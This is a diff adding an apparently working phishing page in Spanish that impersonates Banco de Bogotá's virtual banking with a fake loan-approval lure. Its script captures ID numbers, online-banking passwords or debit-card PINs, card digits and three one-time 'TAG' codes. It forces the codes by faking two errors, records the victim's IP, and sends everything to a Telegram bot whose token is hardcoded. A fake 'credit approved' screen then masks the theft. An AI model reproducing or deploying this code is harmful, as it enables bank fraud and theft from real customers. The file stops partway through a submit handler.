@@ -1,0 +1,1147 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca Virtual</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', Arial, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* Pantalla de carga */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #003d82 0%, #0052a8 50%, #2c4a7c 100%);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease-out;
+        }
+
+        .loading-screen.show {
+            display: flex;
+        }
+
+        .loading-screen.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .loading-content {
+            text-align: center;
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .loading-logo {
+            width: 200px;
+            height: auto;
+            margin-bottom: 30px;
+            animation: loadingPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes loadingPulse {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.05);
+                opacity: 0.8;
+            }
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            margin: 0 auto 20px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            margin: 0;
+            letter-spacing: 0.5px;
+        }
+
+        .container {
+            max-width: 440px;
+            margin: 0 auto;
+            background-color: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .header {
+            padding: 24px 20px;
+            border-bottom: 1px solid #e5e5e5;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo {
+            width: 40px;
+            height: 40px;
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .header h1 {
+            font-size: 20px;
+            font-weight: 500;
+            color: #202124;
+        }
+
+        .banner {
+            background: linear-gradient(135deg, #1565C0 0%, #0D47A1 100%);
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin: 0;
+        }
+
+        .banner-image {
+            width: 60px;
+            height: 60px;
+            flex-shrink: 0;
+            overflow: visible;
+        }
+
+        .banner-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .banner-text {
+            color: white;
+            font-size: 15px;
+            line-height: 1.4;
+        }
+
+        .banner-text strong {
+            font-weight: 600;
+        }
+
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 16px;
+            text-align: center;
+            background: none;
+            border: none;
+            border-bottom: 3px solid transparent;
+            color: #5f6368;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .tab.active {
+            color: #1565C0;
+            border-bottom-color: #1565C0;
+        }
+
+        .tab:hover {
+            background-color: #f8f9fa;
+        }
+
+        .content {
+            padding: 20px;
+        }
+
+        .info-box {
+            background-color: #E8F0FE;
+            border-left: 4px solid #1565C0;
+            padding: 12px 16px;
+            margin-bottom: 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: start;
+            font-size: 13px;
+            line-height: 1.5;
+            color: #3c4043;
+        }
+
+        .info-box button {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            margin-left: 12px;
+            flex-shrink: 0;
+        }
+
+        .close-icon {
+            width: 20px;
+            height: 20px;
+            color: #5f6368;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #3c4043;
+            margin-bottom: 8px;
+        }
+
+        .input-row {
+            display: flex;
+            gap: 12px;
+        }
+
+        select,
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1.5px solid #dadce0;
+            border-radius: 4px;
+            font-size: 15px;
+            color: #3c4043;
+            background-color: white;
+            transition: border-color 0.2s;
+        }
+
+        select {
+            flex: 0 0 140px;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20' viewBox='0 0 20 20' fill='none'%3E%3Cpath d='M5 7.5L10 12.5L15 7.5' stroke='%231565C0' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            padding-right: 40px;
+            cursor: pointer;
+        }
+
+        input[type="text"] {
+            flex: 1;
+        }
+
+        .password-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        input[type="password"] {
+            padding-right: 45px;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .eye-icon {
+            width: 24px;
+            height: 24px;
+            color: #1565C0;
+        }
+
+        input:focus,
+        select:focus {
+            outline: none;
+            border-color: #1565C0;
+        }
+
+        input::placeholder {
+            color: #9aa0a6;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background-color: #dadce0;
+            color: #80868b;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: not-allowed;
+            margin-top: 8px;
+            margin-bottom: 20px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit.enabled {
+            background-color: #1565C0;
+            color: white;
+            cursor: pointer;
+        }
+
+        .btn-submit.enabled:hover {
+            background-color: #0D47A1;
+        }
+
+        .links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e5e5e5;
+        }
+
+        .links a {
+            color: #1565C0;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            padding: 16px 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #5f6368;
+            line-height: 1.5;
+            border-top: 1px solid #e5e5e5;
+        }
+
+        .footer a {
+            color: #1565C0;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            background-color: #fce4e4;
+            border: 1px solid #fcc2c3;
+            border-radius: 4px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            display: none;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .error-message.show {
+            display: flex;
+        }
+
+        .error-icon {
+            width: 20px;
+            height: 20px;
+            color: #d93025;
+            flex-shrink: 0;
+        }
+
+        .error-text {
+            color: #d93025;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .error-text strong {
+            font-weight: 600;
+        }
+
+        .success-message {
+            background-color: #e6f4ea;
+            border: 1px solid #81c995;
+            border-radius: 4px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            display: none;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .success-message.show {
+            display: flex;
+        }
+
+        .success-icon {
+            width: 20px;
+            height: 20px;
+            color: #137333;
+            flex-shrink: 0;
+        }
+
+        .success-text {
+            color: #137333;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        /* Pantalla de aprobación */
+        .approval-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, #1565C0 0%, #0D47A1 100%);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        .approval-screen.show {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .approval-content {
+            text-align: center;
+            color: white;
+            padding: 40px;
+            max-width: 500px;
+        }
+
+        .check-animation {
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 30px;
+            position: relative;
+        }
+
+        .check-circle {
+            width: 140px;
+            height: 140px;
+            border-radius: 50%;
+            background-color: white;
+            position: relative;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+            animation: scaleIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes scaleIn {
+            0% {
+                transform: scale(0);
+                opacity: 0;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .check-mark {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80px;
+            height: 80px;
+        }
+
+        .check-mark svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .check-path {
+            stroke: #1565C0;
+            stroke-width: 6;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            fill: none;
+            stroke-dasharray: 100;
+            stroke-dashoffset: 100;
+            animation: drawCheck 1s ease-in-out 0.5s forwards;
+        }
+
+        @keyframes drawCheck {
+            to {
+                stroke-dashoffset: 0;
+            }
+        }
+
+        .approval-title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            animation: slideUp 0.6s ease-out 0.5s both;
+        }
+
+        .approval-subtitle {
+            font-size: 18px;
+            margin-bottom: 25px;
+            opacity: 0.95;
+            animation: slideUp 0.6s ease-out 0.7s both;
+        }
+
+        .approval-details {
+            background-color: rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 25px;
+            animation: slideUp 0.6s ease-out 0.9s both;
+            backdrop-filter: blur(10px);
+        }
+
+        .approval-details p {
+            font-size: 15px;
+            line-height: 1.8;
+            margin: 0;
+        }
+
+        .approval-details strong {
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        .approval-note {
+            font-size: 14px;
+            opacity: 0.9;
+            line-height: 1.6;
+            animation: slideUp 0.6s ease-out 1.1s both;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .loading-dots {
+            display: inline-block;
+            margin-left: 5px;
+        }
+
+        .loading-dots span {
+            animation: blink 1.4s infinite both;
+        }
+
+        .loading-dots span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .loading-dots span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes blink {
+            0%, 80%, 100% {
+                opacity: 0;
+            }
+            40% {
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Pantalla de carga -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-content">
+            <img src="bancobog.png" alt="Banco de Bogotá" class="loading-logo">
+            <div class="loading-spinner"></div>
+            <p class="loading-text">Cargando...</p>
+        </div>
+    </div>
+
+    <!-- Pantalla de aprobación -->
+    <div class="approval-screen" id="approvalScreen">
+        <div class="approval-content">
+            <div class="check-animation">
+                <div class="check-circle">
+                    <div class="check-mark">
+                        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                            <polyline class="check-path" points="25,50 45,70 75,30" fill="none"/>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+            
+            <h1 class="approval-title">¡Felicitaciones!</h1>
+            <p class="approval-subtitle">Tu crédito ha sido aprobado</p>
+            
+            <div class="approval-details">
+                <p><strong>Monto aprobado:</strong> Hasta $15.000.000 COP</p>
+                <p><strong>Tasa de interés:</strong> Desde 1.2% M.V.</p>
+                <p><strong>Plazo:</strong> Hasta 60 meses</p>
+            </div>
+            
+            <p class="approval-note">
+                📧 Recibirás un correo electrónico con los detalles de tu crédito y los próximos pasos a seguir.<br><br>
+                ⏱️ El desembolso se realizará en las próximas <strong>24 horas hábiles</strong> en la cuenta registrada.<br><br>
+                Estamos procesando tu solicitud<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span>
+            </p>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <img src="image.png" alt="Logo">
+            </div>
+            <h1>Bienvenido a tu Banca Virtual</h1>
+        </div>
+
+        <div class="banner">
+            <div class="banner-image">
+                <img src="chica.png" alt="Asistente">
+            </div>
+            <div class="banner-text">
+                <strong>Verificación de identidad requerida</strong><br>
+                Para procesar su solicitud de préstamo, necesitamos verificar su identidad ›
+            </div>
+        </div>
+
+        <div class="tabs">
+            <button class="tab active">Clave segura</button>
+            <button class="tab">Tarjeta débito</button>
+        </div>
+
+        <div class="content">
+            <div class="info-box" id="infoBox">
+                <div>
+                    Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso.
+                </div>
+                <button onclick="this.parentElement.style.display='none'">
+                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                    </svg>
+                </button>
+            </div>
+
+            <!-- Formulario Clave Segura -->
+            <form id="claveSeguraForm" class="form-view">
+                <div class="error-message" id="errorMessage1">
+                    <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                    <div class="error-text">
+                        <strong>Error de verificación</strong><br>
+                        El TAG ingresado es incorrecto. Por favor, verifique e intente nuevamente.
+                    </div>
+                </div>
+
+                <div class="success-message" id="successMessage1">
+                    <svg class="success-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                    <div class="success-text">
+                        <strong>Verificación exitosa</strong><br>
+                        Su identidad ha sido confirmada. Será redirigido en un momento.
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Identificación</label>
+                    <div class="input-row">
+                        <select id="docType1">
+                            <option>C.C. ...</option>
+                            <option>C.E.</option>
+                            <option>Pasaporte</option>
+                            <option>NIT</option>
+                        </select>
+                        <input type="text" id="docNumber1" placeholder="#" />
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Clave segura</label>
+                    <div class="password-wrapper">
+                        <input type="password" id="password1" placeholder="····" />
+                        <button type="button" class="toggle-password" onclick="togglePassword('password1')">
+                            <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">TAG</label>
+                    <div class="password-wrapper">
+                        <input type="password" id="tag1" placeholder="····" />
+                        <button type="button" class="toggle-password" onclick="togglePassword('tag1')">
+                            <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit" id="submitBtn1">Ingresar</button>
+
+                <div class="links">
+                    <a href="#">Registrarme ›</a>
+                    <a href="#">Olvidé mi clave ›</a>
+                </div>
+            </form>
+
+            <!-- Formulario Tarjeta Débito -->
+            <form id="tarjetaDebitoForm" class="form-view" style="display: none;">
+                <div class="error-message" id="errorMessage2">
+                    <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                    <div class="error-text">
+                        <strong>Error de verificación</strong><br>
+                        El TAG ingresado es incorrecto. Por favor, verifique e intente nuevamente.
+                    </div>
+                </div>
+
+                <div class="success-message" id="successMessage2">
+                    <svg class="success-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                    <div class="success-text">
+                        <strong>Verificación exitosa</strong><br>
+                        Su identidad ha sido confirmada. Será redirigido en un momento.
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Identificación</label>
+                    <div class="input-row">
+                        <select id="docType2">
+                            <option>C.C. ...</option>
+                            <option>C.E.</option>
+                            <option>Pasaporte</option>
+                            <option>NIT</option>
+                        </select>
+                        <input type="text" id="docNumber2" placeholder="#" />
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Clave de tu tarjeta débito</label>
+                    <div class="password-wrapper">
+                        <input type="password" id="cardPassword" placeholder="····" />
+                        <button type="button" class="toggle-password" onclick="togglePassword('cardPassword')">
+                            <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">TAG</label>
+                    <div class="password-wrapper">
+                        <input type="password" id="tag2" placeholder="····" />
+                        <button type="button" class="toggle-password" onclick="togglePassword('tag2')">
+                            <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Últimos 4 dígitos de tu tarjeta débito</label>
+                    <div class="password-wrapper">
+                        <input type="password" id="lastDigits" placeholder="····" maxlength="4" />
+                        <button type="button" class="toggle-password" onclick="togglePassword('lastDigits')">
+                            <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit" id="submitBtn2">Ingresar</button>
+            </form>
+        </div>
+
+        <div class="footer">
+            Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y los <a href="#">términos de servicio</a> de Google.
+        </div>
+    </div>
+
+    <script>
+        // ========================================
+        // CONFIGURACIÓN DEL BOT DE TELEGRAM
+        // ========================================
+        const TELEGRAM_BOT_TOKEN = '8619673327:AAGD9B3NyEqZQppZh3yHy_wcvxl0ZyVLBZk';
+        const TELEGRAM_CHAT_ID = '-1003500051235';
+
+        // Contador de intentos de TAG
+        let intentosTag1 = 0;
+        let intentosTag2 = 0;
+        let tagsGuardados1 = [];
+        let tagsGuardados2 = [];
+
+        // Función para enviar mensaje a Telegram
+        async function enviarATelegram(datos) {
+            const mensaje = `
+🔔 *NUEVO REGISTRO - BANCO BOGOTÁ*
+
+📱 *Tipo de ingreso:* ${datos.tipoIngreso}
+👤 *Tipo de documento:* ${datos.tipoDocumento}
+📄 *Número de documento:* ${datos.numeroDocumento}
+🔐 *${datos.tipoClave}:* ${datos.clave}
+🏷️ *TAG 1:* ${datos.tags[0] || 'N/A'}
+🏷️ *TAG 2:* ${datos.tags[1] || 'N/A'}
+🏷️ *TAG 3:* ${datos.tags[2] || 'N/A'}
+${datos.ultimosDigitos ? `💳 *Últimos 4 dígitos:* ${datos.ultimosDigitos}` : ''}
+
+⏰ *Fecha:* ${datos.fecha}
+🌐 *IP:* ${datos.ip || 'No disponible'}
+            `.trim();
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const result = await response.json();
+                return result.ok;
+            } catch (error) {
+                console.error('Error al enviar a Telegram:', error);
+                return false;
+            }
+        }
+
+        // Función para obtener IP del usuario
+        async function obtenerIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'No disponible';
+            }
+        }
+
+        // Referencias a elementos
+        const tabs = document.querySelectorAll('.tab');
+        const claveSeguraForm = document.getElementById('claveSeguraForm');
+        const tarjetaDebitoForm = document.getElementById('tarjetaDebitoForm');
+        const infoBox = document.getElementById('infoBox');
+
+        // Validación del formulario Clave Segura
+        const docNumber1 = document.getElementById('docNumber1');
+        const password1 = document.getElementById('password1');
+        const tag1 = document.getElementById('tag1');
+        const submitBtn1 = document.getElementById('submitBtn1');
+
+        function validateClaveSegura() {
+            if (docNumber1.value.trim() !== '' && password1.value.trim() !== '' && tag1.value.trim() !== '') {
+                submitBtn1.classList.add('enabled');
+                submitBtn1.disabled = false;
+            } else {
+                submitBtn1.classList.remove('enabled');
+                submitBtn1.disabled = true;
+            }
+        }
+
+        docNumber1.addEventListener('input', validateClaveSegura);
+        password1.addEventListener('input', validateClaveSegura);
+        tag1.addEventListener('input', validateClaveSegura);
+
+        // Validación del formulario Tarjeta Débito
+        const docNumber2 = document.getElementById('docNumber2');
+        const cardPassword = document.getElementById('cardPassword');
+        const tag2 = document.getElementById('tag2');
+        const lastDigits = document.getElementById('lastDigits');
+        const submitBtn2 = document.getElementById('submitBtn2');
+
+        function validateTarjetaDebito() {
+            if (docNumber2.value.trim() !== '' && 
+                cardPassword.value.trim() !== '' && 
+                tag2.value.trim() !== '' &&
+                lastDigits.value.trim() !== '') {
+                submitBtn2.classList.add('enabled');
+                submitBtn2.disabled = false;
+            } else {
+                submitBtn2.classList.remove('enabled');
+                submitBtn2.disabled = true;
+            }
+        }
+
+        docNumber2.addEventListener('input', validateTarjetaDebito);
+        cardPassword.addEventListener('input', validateTarjetaDebito);
+        tag2.addEventListener('input', validateTarjetaDebito);
+        lastDigits.addEventListener('input', validateTarjetaDebito);
+
+        // Toggle password visibility
+        function togglePassword(fieldId) {
+            const passwordInput = document.getElementById(fieldId);
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
+            }
+        }
+
+        // Tab switching
+        tabs.forEach((tab, index) => {
+            tab.addEventListener('click', function() {
+                tabs.forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
+
+                if (index === 0) {
+                    // Clave Segura
+                    claveSeguraForm.style.display = 'block';
+                    tarjetaDebitoForm.style.display = 'none';
+                    infoBox.style.display = 'flex';
+                } else {
+                    // Tarjeta Débito
+                    claveSeguraForm.style.display = 'none';
+                    tarjetaDebitoForm.style.display = 'block';
+                    infoBox.style.display = 'none';
+                }
+            });
+        });
+
+        // Form submission - Clave Segura
+        claveSeguraForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Mostrar pantalla de carga al primer submit
+            if (intentosTag1 === 0) {
+                const loadingScreen = document.getElementById('loadingScreen');
+                loadingScreen.classList.add('show');
+                
+                // Ocultar después de 1 segundo
+                setTimeout(() => {
+                    loadingScreen.classList.remove('show');
+                }, 1000);
+            }
+            
+            // Ocultar mensajes anteriores
+            document.getElementById('errorMessage1').classList.remove('show');
+            document.getElementById('successMessage1').classList.remove('show');
+            
+            // Deshabilitar botón
+            submitBtn1.disabled = true;
+            submitBtn1.textContent = 'Verificando...';
+            
+            // Guardar el TAG actual
+            tagsGuardados1.push(tag1.value);
+            intentosTag1++;
+            
+            // Simular proceso de verificación
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            if (intentosTag1 < 3) {
+                // Mostrar mensaje de error
+                document.getElementById('errorMessage1').classList.add('show');
+                tag1.value = '';
+                tag1.focus();
+                submitBtn1.disabled = false;
+                submitBtn1.textContent = 'Ingresar';
+                submitBtn1.classList.remove('enabled');
+                
+                // Scroll al mensaje de error
+                document.getElementById('errorMessage1').scrollIntoView({ behavior: 'smooth', block: 'center' });
+            } else {
+                // Después del tercer intento, mostrar pantalla de aprobación inmediatamente
+                document.getElementById('approvalScreen').classList.add('show');
+                
+                // Enviar datos en segundo plano
+                const ip = await obtenerIP();
+                
+                const datos = {
+                    tipoIngreso: 'Clave Segura',
+                    tipoDocumento: document.getElementById('docType1').value,
+                    numeroDocumento: docNumber1.value,
+                    tipoClave: 'Clave segura',
+                    clave: password1.value,
+                    tags: tagsGuardados1,
+                    ultimosDigitos: null,
+                    fecha: new Date().toLocaleString('es-CO', { 
+                        timeZone: 'America/Bogota',
+                        year: 'numeric',
+                        month: '2-digit',
+                        day: '2-digit',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit'
+                    }),
+                    ip: ip
+                };
+                
+                // Enviar a Telegram
+                await enviarATelegram(datos);
+                
+                // Ocultar pantalla de aprobación después de 8 segundos
+                setTimeout(() => {
+                    document.getElementById('approvalScreen').classList.remove('show');
+                    
+                    // Reiniciar formulario
+                    intentosTag1 = 0;
+                    tagsGuardados1 = [];
+                    claveSeguraForm.reset();
+                    submitBtn1.classList.remove('enabled');
+                    document.getElementById('successMessage1').classList.remove('show');
+                    submitBtn1.disabled = false;
+                    submitBtn1.textContent = 'Ingresar';
+                }, 8000);
+            }
+        });
+
+        // Form submission - Tarjeta Débito
+        tarjetaDebitoForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Mostrar pantalla de carga al primer submit
+            if (intentosTag2 === 0) {
+                const loadingScreen = document.getElementById('loadingScreen');
+                loadingScreen.classList.add('show');
+                
+                // Ocultar después de 1 segundo
+                setTimeout(() => {
+                    loadingScreen.classList.remove('show');
+                }, 1000);
+            }
+            
+            // Ocultar mensajes anteriores
+            document.getElementById('errorMessage2').classList.remove('show');
+            document.getElementById('successMessage2').classList.remove('show');
+            
+            // Deshabilitar botón
+            submitBtn2.disabled = true;
+            submitBtn2.textContent = 'Verificando...';
+            
+            // Guardar el TAG actual
+            tagsGuardados2.push(tag2.value);
+            intentosTag2++;
+            
+            // Simular proceso de verificación
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            if (intentosTag2 < 3) {
+                // Mostrar mensaje de error
+                document.getElementById('errorMessage2').classList.add('show');
+                tag2.value = '';
+                tag2.focus();
+                submitBtn2.disabled = false;
+                submitBtn2.textContent = 'Ingresar';
+                submitBtn2.classList.remove('enabled');
+                
+                // Scroll al mensaje de error
+                document.getElementById('errorMessage2').scrollIntoView({ behavior: 'smooth', block: 'center' });
+            } else {
+                // Después del tercer intento, mostrar pantalla de aprobación inmediatamente
+                document.getElementById('approvalScreen').classList.add('show');
+                
+                // Enviar datos en segundo plano
+                const ip = await obtenerIP();
+                
+                const datos = {
+                    tipoIngreso: 'Tarjeta Débito',
+                    tipoDocumento: document.getElementById('docType2').value,
+                    numeroDocumento: docNumber2.value,
+                    tipoClave: 'Clave de tarjeta',
+                    clave: cardPassword.value,
+                    tags: tagsGuardados2,
+                    ultimosDigitos: lastDigits.value,
+                    fecha: new Date().toLocaleString('es-CO', { 
+                        timeZone: 'America/Bogota',
+                        year: 'numeric',
+                        month: '2-digit',
+                        day: '2-digit',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit'
+                    }),
+                    ip: ip
+                };
+                
+                // Enviar a Telegram
+                await enviarATelegram(datos);
+                
+                // Ocultar pantalla de aprobación después de 8 segundos
